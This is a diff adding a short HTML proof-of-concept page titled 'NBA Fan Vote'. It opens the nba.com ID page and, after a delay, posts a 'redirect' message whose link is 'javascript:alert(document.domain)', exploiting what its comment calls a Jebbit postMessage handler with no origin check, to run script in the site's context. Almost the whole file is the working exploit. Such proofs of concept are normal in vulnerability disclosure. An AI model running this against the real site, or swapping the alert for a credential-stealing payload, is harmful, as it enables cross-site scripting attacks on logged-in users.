@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>NBA Fan Vote</title></head>
+<body>
+<h1>Loading NBA Voting...</h1>
+<script>
+  // Open the NBA voting page
+  var nbaWindow = window.open(
+    'https://www.nba.com/id/nba'  // authenticated voting page
+  );
+  
+  // Wait for page to load and Jebbit handler to register
+  setTimeout(function() {
+    // Send malicious postMessage — no origin check!
+    nbaWindow.postMessage({
+      action: "redirect",
+      options: {
+        link: "javascript:alert(document.domain)"
+      }
+    }, "*");
+  }, 5000);
+</script>
+</body>
+</html>
